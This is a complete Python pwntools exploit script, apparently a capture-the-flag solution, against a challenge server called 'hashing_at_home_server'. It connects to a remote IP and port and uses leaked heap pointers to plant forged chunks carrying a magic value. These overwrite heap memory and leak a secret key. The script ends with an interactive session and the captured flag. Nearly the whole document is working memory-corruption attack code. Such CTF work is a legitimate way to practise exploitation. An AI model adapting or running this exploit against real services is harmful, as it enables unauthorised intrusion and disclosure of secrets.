"""
nc 35.230.128.35 1337
"""
from pwn import *
import time
import ctypes


DEBUG = True
DEBUG = False


context.update(arch="amd64", os="linux", bits=64)


if __name__ == "__main__":
    challenge = "./hashing_at_home_server"

    CHUNK_SIZE = 32
    CONTEXT_MAGIC = 0x6861736822686f6d

    key_bytes  = "KEYBYTES"
    key_bytes += "B"*(63-len(key_bytes))
    records_file = "./records.bin"
    output_file = "./out.bin"


    SIZE = 0x0a
    c = 'A'
    with open(records_file, 'wb') as f:
        c = chr(ord(c) + 1)
        first_context = c*CHUNK_SIZE*SIZE
        f.write(first_context)

    elf = ELF(challenge)
    if DEBUG:
        argv = [challenge, key_bytes, records_file, output_file]
        io = process(argv, env={'LD_PRELOAD':'/usr/lib/x86_64-linux-gnu/libjemalloc.so'})
        print "Running:"," ".join(argv)
    else:
        io = remote("35.230.128.35", 1337)

    # in case remote is not 64 bit..
    ptr_size = 8

    data = []
    SIZE = 1
    while 1:
        r = io.recv(4096, timeout=2)
        if not r:
            break
        while r:
            addr = r[:ptr_size]
            addr = u64(addr)
            r = r[ptr_size:]
            data_to_hash = r[:CHUNK_SIZE]
            r = r[CHUNK_SIZE:]
            data.append((addr, data_to_hash))
            SIZE += 1



    print "Heap leak:",hex(data[-1][0])
    key_addr = data[-1][0] - 0x40
    print "Key addr:",hex(key_addr)


    ### 1
    # overwrite 1st chunk data with NULL
    ptr = data[0][0]
    io.send(p64(ptr))
    next_addr = ptr
    fake_chunk  = p64(CONTEXT_MAGIC)
    fake_chunk += chr(0x44)
    fake_chunk += "\x00"*((16 - len(fake_chunk)))
    fake_chunk += p64(next_addr)
    fake_chunk += "\x00"*((CHUNK_SIZE - len(fake_chunk)))
    fake_chunk = "\x00"*CHUNK_SIZE
    io.send(fake_chunk)

    # recv values back
    io.recv(ptr_size)
    io.recv(CHUNK_SIZE)

    ### 2
    # overwrite 2nd chunk data with fake_chunk
    ptr = data[1][0]
    io.send(p64(ptr))
    next_addr = 0
    fake_chunk  = p64(CONTEXT_MAGIC)
    fake_chunk += chr(0x44)
    fake_chunk += "\x00"*((16 - len(fake_chunk)))
    fake_chunk += p64(next_addr)
    fake_chunk += "\x00"*((CHUNK_SIZE - len(fake_chunk)))
    
    fake_chunk  = p64(CONTEXT_MAGIC)
    fake_chunk += p64(CONTEXT_MAGIC)
    fake_chunk += p64(CONTEXT_MAGIC)
    fake_chunk += chr(0x44)
    fake_chunk += "\x00"*((CHUNK_SIZE - len(fake_chunk)))
    io.send(fake_chunk)

    # recv values back
    io.recv(ptr_size)
    io.recv(CHUNK_SIZE)

    ### 3
    # use fake chunk to overwrite first_context
    ptr = data[1][0] + 0x18 + 0x10
    io.send(p64(ptr))
    next_addr = key_addr - 0x18
    fake_chunk = p64(CONTEXT_MAGIC)
    fake_chunk += chr(1) # set to 1 to trigger xor
    fake_chunk += "\x00"*((0x10 - len(fake_chunk)))
    fake_chunk += p64(next_addr)
    fake_chunk += "\x00"*((CHUNK_SIZE - len(fake_chunk)))
    io.send(fake_chunk)

    # recv values back
    io.recv(ptr_size)
    io.recv(CHUNK_SIZE)

    ### 4
    # overwrite 1st chunk with NULL and trigger copy
    ptr = data[0][0]
    io.send(p64(ptr))
    fake_chunk = "\x00"*CHUNK_SIZE
    io.send(fake_chunk)

    # recv values back
    io.recv(ptr_size)
    r = io.recv(CHUNK_SIZE)
    print `r`


    io.interactive()
    io.close()
"""
SaF{magic-based_security}
"""